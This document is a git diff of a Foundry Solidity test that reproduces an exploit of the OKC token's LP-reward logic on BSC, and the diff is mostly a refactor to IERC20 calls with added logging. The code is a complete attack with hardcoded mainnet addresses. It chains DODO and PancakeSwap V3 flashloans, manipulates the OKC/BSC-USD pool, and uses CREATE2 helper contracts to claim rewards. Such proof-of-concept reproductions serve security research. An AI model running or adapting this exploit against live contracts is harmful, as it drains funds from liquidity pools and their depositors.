@@ -10,6 +10,7 @@ pragma solidity ^0.8.13;
 //
 // https://twitter.com/bbbb/status/1724320628533039428
 //
+//
 // OKC Creates a PancakePool for BSC-USD:OKC.
 // OKC rewards users who provide liquidity to the pool.
 // Exploit this by Flashloaning BSC-USD and OKC from the pool.
@@ -22,6 +23,7 @@ pragma solidity ^0.8.13;
 import {IPancakeRouter01, IPancakeRouter02} from "../src/interfaces/IPancakeRouter.sol";
 import {IPancakePair} from "../src/interfaces/IPancakePair.sol";
 import {Test, console2} from "forge-std/Test.sol";
+import {IERC20} from "../src/interfaces/IERC20.sol";
 
 contract ExploitHelper {
     address OKC = 0xABba891c633Fb27f8aa656EA6244dEDb15153fE0;
@@ -29,20 +31,19 @@ contract ExploitHelper {
     address PANCAKELP = 0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96;
 
     constructor() payable {
-        (bool success, bytes memory data) = BSCUSD.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
-        uint256 bscusd_balance = abi.decode(data, (uint256));
-        (success, data) = BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKELP, bscusd_balance));
+        // transfer all BSC-USD to PANCAKELP
+        uint256 bscusd_balance = IERC20(BSCUSD).balanceOf(address(this));
+        IERC20(BSCUSD).transfer(PANCAKELP, bscusd_balance); 
 
-        (bool success2, bytes memory data2) = OKC.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
-        uint256 okc_balance = abi.decode(data2, (uint256));
-        (success2, data2) = OKC.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKELP, okc_balance));
+        // transfer all OKC to PANCAKELP
+        uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
+        IERC20(OKC).transfer(PANCAKELP, okc_balance);
     }
 
     // transfer a given tokens balance to another address
-    function transfer(address token0, address token1) external payable {
-        (bool success, bytes memory data) = token0.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
-        uint256 balance = abi.decode(data, (uint256));
-        (success, data) = token0.call(abi.encodeWithSignature("transfer(address,uint256)", token1, balance));
+    function transfer(address token0, address destination) external payable {
+        uint256 balance = IERC20(token0).balanceOf(address(this));
+        IERC20(token0).transfer(destination, balance);
     }
 }
 
@@ -75,25 +76,33 @@ contract OKCProcessLpRewardExploit is Test {
         bytes memory initCode = type(ExploitHelper).creationCode;
         // calculate the addresses for helper contracts using create2
         exploitHelperOne = computeAddress("fuck", keccak256(initCode));
-        exploitHelperTwo = computeAddress("shit", keccak256(initCode));        
-    }
+        exploitHelperTwo = computeAddress("shit", keccak256(initCode));    
 
-    function testStartExploit() public {
         // check initial balance of BSC-USD (should be 0)
         (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
         uint256 balance = abi.decode(data, (uint256));  
         console2.log("Exploit Starting.");
         console2.log("Starting Balance:", balance);
+    }
+
+    function testStartExploit() public {
 
         console2.log("Doing First Flashloan. (DPAADVANCED)");
-        (success, data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", DPAADVANCED));
-        uint256 balance_dpaadvanced = abi.decode(data, (uint256));
+        uint256 balance_dpaadvanced = IERC20(BSCUSD).balanceOf(DPAADVANCED);
+        console2.log("First Amount:", balance_dpaadvanced);  
 
-        (success, data) = DPAADVANCED.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, balance_dpaadvanced, address(this), new bytes(1)));
+        (bool success, bytes memory data) = DPAADVANCED.call(
+          abi.encodeWithSignature(
+            "flashLoan(uint256,uint256,address,bytes)", 
+            0, 
+            balance_dpaadvanced, 
+            address(this), 
+            new bytes(1)
+          ));
 
-        // check initial balance of BSC-USD (should be 6k)
-        (success, data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
-        balance = abi.decode(data, (uint256));    
+        // Exploit is finished at this point.
+        // Check ending balance of BSC-USD (should be 6k)
+        uint256 balance = IERC20(BSCUSD).balanceOf(address(this));
         console2.log("Exploit Finished.");
         console2.log("Ending Balance:", balance);
     }
@@ -111,57 +120,84 @@ contract OKCProcessLpRewardExploit is Test {
 
         console2.log("Doing Second Flashloan. (DPAORACLE)");
         // get BSDUSD balance of flashloaner 
-        (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", DPPORACLE));
-        uint256 balance = abi.decode(data, (uint256));
+        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE);
+        console2.log("Second Amount:", balance);
 
         // flashloan balance to exploit contract
-        (success, data) = DPPORACLE.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, balance, address(this), new bytes(2)));
+        (bool success, bytes memory data) = DPPORACLE.call(
+          abi.encodeWithSignature(
+            "flashLoan(uint256,uint256,address,bytes)", 
+            0, 
+            balance, 
+            address(this), 
+            new bytes(2)
+          ));
 
         console2.log("Paying First Flashloan. (DPAADVANCED)");
-        BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", DPAADVANCED, quoteAmount));
+        IERC20(BSCUSD).transfer(DPAADVANCED, quoteAmount);
       }
 
       if (msg.sender == DPPORACLE) {
         console2.log("Doing Third Flashloan. (DPAORACLE_2)");
 
         // get BSDUSD balance of flashloaner 
-        (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", DPPORACLE_2));
-        uint256 balance = abi.decode(data, (uint256));
+        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE_2);
+        console2.log("Third Amount:", balance);
 
         // flashloan balance to exploit contract
-        (success, data) = DPPORACLE_2.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, balance, address(this), new bytes(3)));
+        (bool success, bytes memory data) = DPPORACLE_2.call(
+          abi.encodeWithSignature(
+            "flashLoan(uint256,uint256,address,bytes)", 
+            0, 
+            balance, 
+            address(this), 
+            new bytes(3)
+          ));
 
         console2.log("Paying Second Flashloan. (DPPORACLE)");
-        BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", DPPORACLE, quoteAmount));
-
+        IERC20(BSCUSD).transfer(DPPORACLE, quoteAmount);
       }
 
       if (msg.sender == DPPORACLE_2) {
         console2.log("Doing Fourth Flashloan. (DPP)");
 
         // get BSDUSD balance of flashloaner 
-        (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", DPP));
-        uint256 balance = abi.decode(data, (uint256));
+        uint256 balance = IERC20(BSCUSD).balanceOf(DPP);
+        console2.log("Fourth Amount:", balance);
 
         // flashloan balance to exploit contract
-        (success, data) = DPP.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, balance, address(this), new bytes(4)));
+        (bool success, bytes memory data) = DPP.call(
+          abi.encodeWithSignature(
+            "flashLoan(uint256,uint256,address,bytes)", 
+            0, 
+            balance, 
+            address(this), 
+            new bytes(4)
+          ));
 
         console2.log("Paying Third Flashloan. (DPPORACLE_2)");
-        BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", DPPORACLE_2, quoteAmount));
+        IERC20(BSCUSD).transfer(DPPORACLE_2, quoteAmount);
       }
 
       if (msg.sender == DPP) {
         console2.log("Doing Fifth Flashloan. (DPPORACLE_3)");
 
         // get BSDUSD balance of flashloaner 
-        (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", DPPORACLE_3));
-        uint256 balance = abi.decode(data, (uint256));
+        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE_3);
+        console2.log("Fifth Amount:", balance);
 
         // flashloan balance to exploit contract
-        (success, data) = DPPORACLE_3.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, balance, address(this), new bytes(5)));
+        (bool success, bytes memory data) = DPPORACLE_3.call(
+          abi.encodeWithSignature(
+            "flashLoan(uint256,uint256,address,bytes)", 
+            0, 
+            balance, 
+            address(this), 
+            new bytes(5)
+          ));
 
         console2.log("Paying Fourth Flashloan. (DPP)");
-        BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", DPP, quoteAmount));
+        IERC20(BSCUSD).transfer(DPP, quoteAmount);
       } 
 
       if (msg.sender == DPPORACLE_3) {
@@ -170,11 +206,18 @@ contract OKCProcessLpRewardExploit is Test {
         // call pancakeswap.flash()
         // PANCAKESWAPv3 Pools allow to flashloan the underlying asset pair
         // Flashloan 2500000000000000000000000 BSC-USD to this attack contract
-        (bool success, bytes memory data) = PANCAKEV3POOL.call(abi.encodeWithSignature("flash(address,uint256,uint256,bytes)", address(this), attack_uint256_1, 0, abi.encode([4,attack_uint256_1])));
+        (bool success, bytes memory data) = PANCAKEV3POOL.call(
+          abi.encodeWithSignature(
+            "flash(address,uint256,uint256,bytes)", 
+            address(this), 
+            attack_uint256_1, 
+            0, 
+            abi.encode([4,attack_uint256_1])
+          ));
 
         // Start repaying flashloans in reverse order.
         console2.log("Paying Fifth Flashloan. (DPPORACLE_3)");
-        BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", DPPORACLE_3, quoteAmount));
+        IERC20(BSCUSD).transfer(DPPORACLE_3, quoteAmount);
       } 
 
     }
@@ -186,11 +229,15 @@ contract OKCProcessLpRewardExploit is Test {
         bytes calldata data // will be [abi.encode([4,2500000000000000000000000]]
     ) external {
 
+      uint256 total_position = IERC20(BSCUSD).balanceOf(address(this));
+      console2.log("Total BSC-USD Flashloaned:", total_position);
+
       address[] memory path = new address[](2);
       path[0] = BSCUSD;
       path[1] = OKC;
 
 		  uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
+      console2.log("Amount of OKC to swap for:", amountOut[1]);
 
       //function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
       //Swap all the flashloaned BSC-USD for OKC
@@ -198,10 +245,9 @@ contract OKCProcessLpRewardExploit is Test {
 
       // Transfer OKC to exploitHelperOne address before deploying contract to address.
       console2.log("Transfer 10000000000000000 OKC to exploitHelperOne address.");
-      OKC.call(abi.encodeWithSignature("transfer(address,uint256)", exploitHelperOne, 10000000000000000));
+      IERC20(OKC).transfer(exploitHelperOne, 10000000000000000);
 
       bytes memory createCode = type(ExploitHelper).creationCode;
-
       // Deploy exploitHelperOne 
       console2.log("Deploy exploitHelperOne w/ Create2 to address.");
 
@@ -210,11 +256,12 @@ contract OKCProcessLpRewardExploit is Test {
 
       // Transfer 100000000000000 BSC-USD to exploitHelperTwo before deploying contract.
       console2.log("Transfer 100000000000000 BSC-USD to exploitHelperTwo address.");
-      BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", exploitHelperTwo, 100000000000000));
+      IERC20(BSCUSD).transfer(exploitHelperTwo, 100000000000000);
 
       // Transfer 1 OKC to exploitHelperTwo before deploying contract.
       console2.log("Transfer 1 OKC to exploitHelperTwo address.");
-      OKC.call(abi.encodeWithSignature("transfer(address,uint256)", exploitHelperTwo, 1));
+      IERC20(OKC).transfer(exploitHelperTwo, 1);
+
 
       // Deploy exploitHelperTwo
       console2.log("Deploy exploitHelperTwo w/ Create2 to address.");
@@ -226,16 +273,14 @@ contract OKCProcessLpRewardExploit is Test {
       (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IPancakePair(PANCAKELP).getReserves();
 
       // get OKC balance
-      (bool success, bytes memory data) = OKC.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
-      uint256 okc_balance = abi.decode(data, (uint256));
+      uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
 
       uint total = IPancakeRouter01(PANCAKEROUTER).quote(okc_balance, reserve1, reserve0);
-
       // Transfer BSC-USD to PANCAKELP
-      BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKELP, total));
+      IERC20(BSCUSD).transfer(PANCAKELP, total);
 
       // Transfer OKC to PANCAKELP
-      OKC.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKELP, okc_balance));
+      IERC20(OKC).transfer(PANCAKELP, okc_balance);
 
       // Become an OKC LP by minting LP tokens.
       uint lpTokenAmt = IPancakePair(PANCAKELP).mint(address(this));
@@ -253,7 +298,7 @@ contract OKCProcessLpRewardExploit is Test {
       // approve pancake router to spend PANCAKELP liquidity tokens
       IPancakePair(PANCAKELP).approve(PANCAKEROUTER, type(uint256).max);
 
-      // remove liquidity (OKC/BSC-UDC) from PANCAKEROUTER
+      // remove liquidity (OKC/BSC-USD) from PANCAKEROUTER
       IPancakeRouter01(PANCAKEROUTER).removeLiquidity(
         OKC,
         BSCUSD,
@@ -271,11 +316,10 @@ contract OKCProcessLpRewardExploit is Test {
       exploitHelperTwo.call(abi.encodeWithSignature("transfer(address,address)", OKC, address(this)));
 
       // Get current balance of OKC Tokens held by this contract
-      (success, data) = OKC.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
-      okc_balance = abi.decode(data, (uint256));
+      okc_balance = IERC20(OKC).balanceOf(address(this));
 
       // approve pancake router to spend OKC tokens
-      OKC.call(abi.encodeWithSignature("approve(address,uint256)", PANCAKEROUTER, type(uint256).max));
+      IERC20(OKC).approve(PANCAKEROUTER, type(uint256).max);
 
       path[0] = OKC;
       path[1] = BSCUSD;
@@ -290,15 +334,13 @@ contract OKCProcessLpRewardExploit is Test {
       );
 
       // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL (payback flashloan?) 
-      BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKEV3POOL, 2500250000000000000000000));
-
+      IERC20(BSCUSD).transfer(PANCAKEV3POOL, 2500250000000000000000000);
     }
 
     // Pancake swap callback
     function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
       // transfer BSC-USD to PANCAKELP
-      BSCUSD.call(abi.encodeWithSignature("transfer(address,uint256)", PANCAKELP, abi.decode(data, (uint256))));
-
+      IERC20(BSCUSD).transfer(PANCAKELP, abi.decode(data, (uint256)));
     }
 
     function computeAddress(bytes32 salt, bytes32 creationCodeHash) public view returns (address addr) {
